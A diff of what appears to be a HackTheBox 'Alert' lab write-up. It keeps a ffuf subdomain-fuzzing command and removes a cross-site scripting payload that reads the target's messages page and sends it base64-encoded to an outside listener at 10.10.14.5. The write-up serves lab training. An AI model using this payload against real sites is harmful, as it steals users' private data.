@@ -85,16 +85,3 @@
         ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -H "http://FUZZ.alert.htb/" -u http://alert.htb -fw 20
         ```
 
-???+ Danger "Cross Site Scripting"
-
-    === ":octicons-file-code-16: pwn.js"
-
-        ``` js
-        var req = new XMLHttpRequest();
-        req.open('GET', 'http://alert.htb/messages.php', false);
-        req.send();
-
-        var req2 = new XMLHttpRequest();
-        req2.open('GET', 'http://10.10.14.5:3000/?content=' + btoa(req.responseText),true);
-        req2.send();
-        ```
